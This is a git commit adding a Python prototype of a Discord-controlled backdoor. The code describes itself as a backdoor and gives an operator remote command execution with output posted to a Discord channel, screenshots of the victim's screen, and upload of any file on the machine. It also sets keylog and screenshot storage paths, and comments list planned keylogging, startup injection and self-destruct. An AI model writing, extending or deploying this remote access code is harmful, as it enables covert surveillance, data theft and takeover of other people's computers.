62bacaa827f14f16ab2c456ebae61badca725d4f
HueHueberry <hubertfoliente@gmail.com>
2022-01-31 10:01:09 +0800

    Initial commit

---
+++ prototype.py
@@ -0,0 +1,162 @@
+from discord.ext import commands
+from discord.ext.commands.errors import MissingRequiredArgument
+import discord
+import subprocess
+import pyautogui
+import math
+import os
+
+# for keeping in-track of which bot
+# is actually responding
+nickname = '<nicknamehere>'
+
+# discord variables (setting up prefix depending on nickname)
+# to avoid multiple execution of command
+bot = commands.Bot(command_prefix=(nickname + ' | '))
+token = '<tokenhere>'
+
+# for keeping track of the directory configuraton files
+# keylogs : directory where keylogged strokes are to be stored
+config_dir = {
+	'keylogs' : 'C:\\Users\\name\\AppData\\Local\\Temp\\keylogs\\',							# where logs of keystrokes will be saved
+	'screenshots' : 'C:\\Users\\name\\AppData\\Local\\Temp\\screenshots',					# where screenshots will be stored
+	'hybrids' : ''																			# where command config will be placed
+}
+
+#####################################
+#    ADDITIONAL NEEDED FUNCTIONS    #
+#####################################
+# made for limiting the buffer to be sent in discord
+# returns array of strings that will be sent individualy
+# as an output (discord limit <= 4000)
+def limiter(str_input, limit):
+	max = math.ceil(len(str_input) / limit)
+	output = []
+
+	# pops the first 3000 characters
+	for i in range(max):
+		output.append(str_input[:limit])
+		str_input = str_input[limit:]
+
+	return output
+
+
+#############################
+#    EVENTS DEFINED HERE    #
+#############################
+@bot.event
+async def on_ready():
+	print ('[CommandBot] State : Ready!')
+
+
+
+###############################
+#    COMMANDS DEFINED HERE    #
+###############################
+@bot.command(
+	brief='Tests if the bot is alive.',
+	description='Checks if the bot is alive by sending a constant response.')
+
+async def test(ctx):
+	print (f'[CommandBot {nickname}] Test command called!')
+	await ctx.send(f'[CommandBot {nickname}] BOT IS WORKING!')
+
+
+
+
+# note: can be crashed if the argument has
+# 4000+ size of message
+@bot.command(
+	brief='Tests if the bots recieve the messages properly',
+	description='Tests if the commands recieved is recieved properly by replying the message back.'
+)
+async def ping(ctx, arg1):
+	try:
+		print (f'[CommandBot {nickname}] Ping response : {arg1}')
+		await ctx.send(f'[CommandBot {nickname}] Responds {arg1}!')
+	except MissingRequiredArgument:
+		print (f'[CommandBot Err {nickname}] Wrong usage of ping')
+		await ctx.send(f'[CommandBot {nickname}] Usage : ping <message>')
+
+
+
+
+@bot.command(
+	brief='Executes system shell with specified arguments.',
+	description='Executes system shell (can be in kernel level if backdoor is ran as administrator)'
+)
+async def shell(ctx, *args):
+	try:
+		command_shell = list(args)
+		print (f'[CommandBot {nickname}] Execute shell { command_shell }')
+
+		# get the output with subprocess
+		result, output = subprocess.getstatusoutput(command_shell)
+		await ctx.send(f'[CommandBot {nickname}] Shell Output:')
+		
+		# limits the size of the output (limits 1500 texts)
+		output_to_be_sent = limiter(output, 1500)
+		for message in output_to_be_sent:
+			await ctx.send(f'```{message}```')
+
+		# for telling that this is finished
+		await ctx.send(f'[CommandBot {nickname}] Shell Done.')
+
+	except MissingRequiredArgument:
+		print (f'[CommandBot {nickname}] problem in executing shell')
+		await ctx.send(f'[CommandBot {nickname}] Usage : shell <cli command [args]>')
+
+
+
+
+@bot.command(
+	brief='Takes screenshot on user and sends output as file',
+	description='Takes a screenshot from the user and sends file in the channel.\nThis uses pyautogui technology'
+)
+async def sshot(ctx):
+	# takes screenshot and save as 00000.png
+	sshot = pyautogui.screenshot()
+	sshot.save('00000.png')
+
+	# sends this file to the server
+	await ctx.send(file=discord.File('00000.png'))
+
+
+
+
+@bot.command(
+	brief='Uploads and gets the file on the specified path',
+	description='This command gets the file from the specified path and uploads on the channel.'
+)
+async def get_file(ctx, file_path):
+	try:
+		if (os.path.isfile(file_path)):
+			await ctx.send(file=discord.File(file_path))
+		else:
+			await ctx.send(f'[CommandBot {nickname}] File entered does not exist!')
+
+	except MissingRequiredArgument:
+		print (f'[CommandBot {nickname}] problem in finding file')
+		await ctx.send(f'[CommandBot {nickname}] Usage : get_file <file path>')
+
+
+
+
+@bot.command()
+async def configlookup(ctx):
+	await ctx.send(f'[CommandBot {nickname}] Directory configuration list :')
+	await ctx.send(f"""```
+The following are the paths where the logs will be pushed
+============================================================
+keylogs			{config_dir['keylogs']}
+hybrids			{config_dir['hybrids']}
+screenshots		{config_dir['screenshots']}
+============================================================```""")
+
+
+# additional features : change directory, show config directories, inject startup
+# keylog, change config directory values, delete file, self destruct
+# add command
+
+# start the bot
+bot.run(token)
